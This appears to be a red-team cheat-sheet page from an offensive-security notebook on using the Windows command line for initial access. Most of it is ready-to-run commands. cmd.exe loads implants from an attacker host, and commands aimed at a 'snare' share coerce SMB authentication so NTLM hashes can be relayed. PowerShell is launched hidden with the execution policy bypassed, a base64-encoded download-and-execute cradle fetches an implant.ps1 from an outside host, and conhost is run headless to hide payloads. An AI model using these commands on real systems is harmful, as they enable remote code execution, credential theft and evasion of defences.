---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - living-off-the-land
  - windows
---
# Windows CLI Console

## Command Prompt

> [!INFO] [Character Maximum Limit](https://learn.microsoft.com/en-us/troubleshoot/windows-client/shell-experience/command-line-string-limitation)
> The maximum length of the string that you can use at the command prompt is 8191 characters.

Execute commands.

```
C:\> cmd.exe /c <commands>
```

```
C:\> cmd.exe - < [<drive_letter>:\]path\to\implant.txt

C:\> cmd.exe /k - \\<attacker_IP>\path\to\implant.txt

C:\> cmd.exe /k < \\<attacker_IP>\path\to\implant.txt
```

Execute command to perform SMB authentication relay.

```
C:\> echo 1 > //snare/share

C:\> pushd \\snare\share

C:\> cmd.exe /k \\snare\share

C:\> cmd.exe /c \\snare\share

C:\> start \\snare\share

C:\> mkdir \\snare\share

C:\> type \\snare\share

C:\> dir \\snare\share

C:\> net.exe view \\snare

C:\> "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File \\snare\share\file.txt
```

TODO: Check the rest

```
find.exe, findstr.exe, [x]copy, move, replace.exe, del, rename and many more!
```

## PowerShell

System32 is for 32-bit powershell payloads

```
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -w hidden -nologo -noni -nop -ex bypass -f file.ps1

C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -w hidden -nologo -noni -nop -ep bypass -f file.ps1
```

SysWOW64 is for 64-bit powershell payloads

```
C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -nop -ep bypass -f shell.ps1

C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -w hidden -nologo -noni -nop -ep bypass -f shell.ps1
```

### Base64 encoded

Encode the string of commands.

```
$ str="IEX ((New-Object Net.WebClient).DownloadString('http://<IP>/implant.ps1'))"

$ echo -en $str | iconv -t UTF-16LE | base64 -w 0

$ echo -en $str | iconv -t UTF-16LE | basenc -w 0 --base64

$ echo -en $str | iconv -t UTF-16LE | openssl enc -base64 -A

$ echo -en $str | iconv -t UTF-16LE | openssl enc -a -e -A
```

Then execute it in a one-liner.

```
C:\> powershell.exe -nop -NonI -Nologo -w hidden -enc <base64_encoded>
```

### Execution Policy

```
PS C:\> Set-ExecutionPolicy Bypass -Scope <CurrentUser | Process> [-File C:\path\to\file.ps1

PS C:\> $Env:PSExecutionPolicyPreference="bypass"
```

Execute cmdlet to perform SMB authentication relay.

```
PS C:\> Get-ChildItem \\snare\share

PS C:\> Resolve-DnsName -LlmnrOnly Snare 2> $Null
```

## Conhost

```
C:\> conhost.exe --headless <commands>
```

```
C:\> conhost.exe --headless powershell.exe -nop -NonI -Nologo -w hidden -enc <base64_encoded>

C:\> conhost.exe --headless powershell.exe -noni -nop -ep bypass -file implant.ps1
```

---
## References

### Backlinks

- [[03 - Malware Development/Global Helpers/Evasion/Obfuscation Techniques/Cross Platform/PowerShell||Malware Development: PowerShell Obfuscation Techniques]]

- [[Batch|Malware Development: Batch Obfuscation Techniques]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Implant/Desktop/Windows/Payloads/One-Liners/Reverse Shells/PowerShell|Callback Shells: Powershell]]

### LOLBAS

- [LOLBAS: Cmd](https://lolbas-project.github.io/lolbas/Binaries/Cmd/)

- [LOLBAS: Conhost](https://lolbas-project.github.io/lolbas/Binaries/Conhost/)

### Github

- [r00t-3xp10it: CmdLine Scripts for Reverse TCP Shell Addicts](https://github.com/r00t-3xp10it/venom/wiki/CmdLine-%26-Scripts-for-reverse-TCP-shell-addicts)

### Mrd0x

- [Mrd0x: Introduction to Parent-Child Process Evasion](https://mrd0x.com/introduction-to-parent-child-process-evasion/)

### NetSPI

- [NetSPI: 15 Ways to Bypass the PowerShell Execution Policy](https://www.netspi.com/blog/technical-blog/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)

### Osanda

- [Osanda: Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)